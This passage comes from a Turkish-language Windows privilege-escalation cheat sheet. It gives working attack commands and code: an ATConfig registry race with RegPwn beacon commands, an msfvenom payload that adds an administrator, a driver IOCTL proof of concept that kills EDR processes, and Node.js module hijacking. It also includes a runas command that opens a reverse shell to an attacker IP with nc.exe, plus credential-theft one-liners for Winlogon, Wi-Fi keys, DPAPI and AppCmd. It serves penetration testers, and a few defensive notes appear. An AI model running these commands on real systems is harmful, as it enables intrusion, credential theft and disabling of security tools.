- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` kullanıcı tarafından kontrol edilen konfigürasyonu saklar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** value değerini doldurun.
2. Secure-desktop kopyasını tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. Bir **oplock**’u `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerinde tutarak **race**’i kazanın; oplock tetiklendiğinde, **HKLM Session ATConfig** anahtarını korunan bir HKLM hedefini işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği value değerini yönlendirilmiş HKLM path içine yazar.

Arbitrary HKLM value write elde ettikten sonra, service konfigürasyon değerlerini üzerine yazarak LPE’ye pivot yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabildiği bir service seçin (ör. **`msiserver`**) ve yazmadan sonra onu tetikleyin. **Not:** public exploit implementasyonu, race’in bir parçası olarak **lock the workstation** yapar.

Örnek tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz bu, **bundan alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services durumunda bu, **keyfi code çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable yolu quotes içinde değilse, Windows boşluktan önceki her bitişi çalıştırmaya çalışır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmaya çalışacaktır:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Tüm tırnaksız service path’leri listele, yerleşik Windows service’lerine ait olanları hariç tut:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu açığı** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` Metasploit ile bir service binary'sini manuel olarak oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows, bir servis başarısız olduğunda gerçekleştirilecek eylemleri kullanıcıların belirtmesine izin verir. Bu özellik, bir binary dosyasına işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebilir durumdaysa, privilege escalation mümkün olabilir. Daha fazla ayrıntı [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) içinde bulunabilir.

## Applications

### Installed Applications

**binarylerin** izinlerini (belki birini üzerine yazıp privilege escalation yapabilirsiniz) ve **klasörlerin** izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bir yapılandırma dosyasını değiştirerek bazı özel dosyaları okuyup okuyamayacağını veya Bir Yönetici hesabı tarafından çalıştırılacak bir binary’yi değiştirip değiştiremeyeceğini kontrol et (schedtasks).

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörleri altındaki herhangi bir plugin DLL'ini otomatik olarak yükler. Yazılabilir bir portable/copy kurulum varsa, kötü amaçlı bir plugin bırakmak `notepad++.exe` içinde her başlatmada otomatik code execution sağlar ( `DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Başka bir kullanıcı tarafından çalıştırılacak bazı registry veya binary üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilginç **autoruns locations** hakkında daha fazla bilgi edinmek için aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Olası **third party weird/vulnerable** driver'ları arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun makul bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `RTL_QUERY_REGISTRY_DIRECT` ile `int readValue` gibi bir stack scalar içine yapar. Eğer `RTL_QUERY_REGISTRY_TYPECHECK` eksikse, `EntryContext` geliştiricinin beklediği tipe göre değil, **gerçek** registry tipine göre yorumlanır.

Bu, iki faydalı primitive oluşturur:

- **Confused deputy / oracle**: kullanıcı kontrollü bir absolute `\Registry\...` path, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar üzerinden varlığı sızdırmasına ve bazen çağıranın doğrudan erişemeyeceği değerleri okumasına izin verir.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry value tipine bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış binary buffer olarak type-confused hale gelir.

Pratik exploitation notları:

- **Windows 8+ mitigation**: sorgu, `RTL_QUERY_REGISTRY_DIRECT` ile ama `RTL_QUERY_REGISTRY_TYPECHECK` olmadan **untrusted hive** üzerinde gerçekleşirse, kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile crash olur. Exploit edilebilirliği korumak için, `HKCU` altında değer hazırlamak yerine **trusted system hives içindeki attacker-writable key**'leri arayın.
- **Trusted-hive staging**: `NtObjectManager` kullanarak `\Registry\Machine` altındaki writable descendants'ları enumerate edin ve sandbox'lı context'lerden erişilebilen key'leri bulmak için taramayı kopyalanmış bir **low-integrity** token ile yeniden çalıştırın:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4 baytlık bir `int` içine yapılan 8 baytlık doğrudan yazma, bitişik stack verisini bozar ve yakındaki bir callback/function pointer’ı kısmen overwrite edebilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`’in bir `UNICODE_STRING`’e işaret etmesini bekler. Kod önce attacker-controlled bir `REG_DWORD`’u stack scalar’a yüklüyor ve sonra aynı buffer’ı string okuması için yeniden kullanıyorsa, attacker `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer’ını kısmen etkiler; bu da yarı kontrollü bir kernel write üretir.
- **`REG_BINARY`**: büyük binary data için, direct mode `EntryContext` üzerindeki ilk `LONG` değerini signed bir buffer size olarak ele alır. Önceki bir `REG_DWORD` okuması yeniden kullanılan scalar’da attacker-controlled **negatif** bir değer bırakırsa, sonraki `REG_BINARY` query attacker bytes’larını doğrudan bitişik stack slot’ların üzerine kopyalar; bu da çoğu zaman tam callback-pointer overwrite için en temiz yoldur.

Güçlü hunting pattern: **aynı stack değişkenine, yeniden initialize etmeden heterojen registry read yapmak**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer’ları ve ilk registry okumasının ikinci bir okumanın gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path’ler için grep yapın.

#### Cihaz nesnelerinde eksik FILE_DEVICE_SECURE_OPEN kullanımı (LPE + EDR kill) suistimali

Bazı imzalı üçüncü taraf driver’lar, cihaz object’lerini IoCreateDeviceSecure ile güçlü bir SDDL kullanarak oluşturur ama DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarını yapmayı unutur. Bu flag olmadan, cihaz extra bir component içeren bir path üzerinden açıldığında secure DACL uygulanmaz; böylece ayrıcalıksız herhangi bir kullanıcı, şu tarz bir namespace path kullanarak handle alabilir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir vaka)

Bir kullanıcı cihazı açabildiğinde, driver tarafından sunulan privileged IOCTL’lar LPE ve tampering için suistimal edilebilir. Sahada gözlemlenen örnek yetenekler:
- Rastgele process’ler için full-access handle döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence tricks).
- Arbitrary process’leri terminate etme; buna Protected Process/Light (PP/PPL) de dahil, böylece kernel üzerinden user land’den AV/EDR kill mümkün olur.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için azaltma önlemleri
- DACL tarafından kısıtlanması amaçlanan device object'ler oluşturulurken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için caller context doğrulayın. Process termination veya handle return izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (access masks, METHOD_*, input validation) ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Savunucular için tespit fikirleri
- Şüpheli device name'lere yapılan user-mode açılışlarını (ör. \\ .\\amsdk*) ve abuse'a işaret eden belirli IOCTL sequence'lerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny list'elerinizi sürdürün.


## PATH DLL Hijacking

Eğer PATH içinde bulunan bir folder içinde **write permissions**'ınız varsa, bir process tarafından yüklenen bir DLL'i hijack edip **ayrıcalıkları yükseltebilirsiniz**.

PATH içindeki tüm folder'ların permissions'ını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Daha fazla bilgi için bu kontrolü nasıl kötüye kullanacağınız:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Bu, **Windows uncontrolled search path** varyantıdır ve **Node.js** ile **Electron** uygulamalarını, `require("foo")` gibi çıplak bir import gerçekleştirdiklerinde ve beklenen module **eksik** olduğunda etkiler.

Node, paketleri dizin ağacında yukarı doğru yürüyerek ve her üst dizindeki `node_modules` klasörlerini kontrol ederek çözer. Windows'ta bu yürüyüş sürücü köküne kadar ulaşabilir; bu yüzden `C:\Users\Administrator\project\app.js` içinden başlatılan bir uygulama şu yolları yoklayabilir:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Eğer **düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package klasörü) yerleştirebilir ve bir **daha yüksek ayrıcalıklı Node/Electron process**'in eksik bağımlılığı çözmesini bekleyebilir. Payload, kurban process'in güvenlik bağlamında çalışır; bu nedenle hedef bir yönetici olarak, yükseltilmiş bir scheduled task/service wrapper içinden veya otomatik başlatılan ayrıcalıklı bir desktop app içinden çalışıyorsa bu durum **LPE** olur.

Bu özellikle şu durumlarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlanmışsa
- üçüncü taraf bir library `require("foo")` çağrısını `try/catch` ile sarıp hata durumunda devam ediyorsa
- bir package production build'lerden kaldırılmışsa, packaging sırasında atlanmışsa veya kurulumu başarısız olmuşsa
- savunmasız `require()` ana application code yerine dependency tree'nin derinlerinde yer alıyorsa

### Savunmasız hedefleri araştırma

Çözümleme yolunu kanıtlamak için **Procmon** kullanın:

- `Process Name` için hedef executable'ı filtreleyin (`node.exe`, Electron app EXE'si veya wrapper process)
- `Path` için `contains` `node_modules` şeklinde filtreleyin
- `NAME NOT FOUND` ve `C:\node_modules` altındaki son başarılı açılışa odaklanın

Açılmış `.asar` dosyalarında veya application kaynaklarında yararlı code-review kalıpları:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon veya kaynak incelemesinden **eksik paket adını** belirleyin.
2. Henüz mevcut değilse kök arama dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Beklenen tam adıyla bir module bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` yapmaya çalışır ve meşru modül mevcut değilse, Node `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu desene uyan eksik optional module’lere gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur, ancak **technique** yeniden kullanılabilir kısımdır: ayrıcalıklı bir Windows Node/Electron process’inin resolve edeceği herhangi bir **missing bare import** bulun.

### Detection ve hardening fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya oraya yeni `.js` dosyaları/package’lar yazdığında alert verin.
- Yüksek bütünlüklü process’lerin `C:\node_modules\*` içinden okumasını hunt edin.
- Production’da tüm runtime dependency’leri package edin ve `optionalDependencies` kullanımını audit edin.
- Üçüncü taraf code içinde sessiz `try { require("...") } catch {}` pattern’lerini review edin.
- Library destekliyorsa optional probe’ları disable edin (örneğin, bazı `ws` deployments eski `utf-8-validate` probe’unu `WS_NO_UTF_8_VALIDATE=1` ile avoid edebilir).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts dosyası

hosts dosyasında sabitlenmiş diğer bilinen bilgisayarları kontrol et
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **restricted services** için kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Firewall ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kural oluştur, kapat, kapat...)**

Daha fazla[ ağ enumerasyonu için komutlar burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde de bulunabilir.

Root user elde ederseniz herhangi bir portta dinleme yapabilirsiniz (ilk kez bir portta dinlemek için `nc.exe` kullandığınızda, GUI üzerinden `nc`'nin firewall tarafından izinli olup olmaması gerektiğini sorar).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash’i kolayca root olarak başlatmak için `--default-user root` deneyebilirsiniz

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe keşfedebilirsiniz

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, kullanıcı kimlik bilgilerini **Windows**’un kullanıcılar için **otomatik olarak giriş yapabildiği** sunucular, web siteleri ve diğer programlar için saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini saklayıp böylece tarayıcılar üzerinden otomatik giriş yapabilecekleri anlamına geliyor gibi görünebilir. Ama durum böyle değildir.

Windows Vault, Windows’un kullanıcılar için otomatik olarak giriş yapabildiği kimlik bilgilerini saklar; bu da **kaynaklara erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** bu Credential Manager ve Windows Vault’tan yararlanıp, kullanıcıların sürekli kullanıcı adı ve şifre girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmedikçe, belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün değildir diye düşünüyorum. Bu yüzden, uygulamanız vault’tan yararlanmak istiyorsa, bir şekilde **credential manager ile iletişim kurmalı ve varsayılan storage vault’tan o kaynak için kimlik bilgilerini istemelidir**.

Makinede kayıtlı kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kaydedilmiş kimlik bilgilerini kullanmak için `/savecred` seçenekleriyle `runas` kullanabilirsiniz. Aşağıdaki örnek, bir SMB share üzerinden uzak bir binary çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verilen bir kimlik bilgisi kümesiyle `runas` kullanımı.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sisteminde asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi içeren senaryolarda, sistemin domain authentication sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}`, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) bilgisini temsil eder. **Kullanıcının özel anahtarlarını aynı dosyada koruyan master key ile birlikte bulunan DPAPI key**, genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, bu nedenle içeriğinin CMD'de `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini belirtmek önemlidir).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Şifresini çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**master password** ile korunan **credentials files** genellikle şurada bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** genellikle **scripting** ve otomasyon görevlerinde, şifreli kimlik bilgilerini kolayca saklamak için kullanılır. Bu kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları aynı bilgisayardaki aynı kullanıcı tarafından çözülebilecekleri anlamına gelir.

Bir dosyada bulunan bir PS credentials'ı **decrypt** etmek için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının var olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, çoğu **DLL Sideloading**’e karşı savunmasızdır (**Bilgi:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
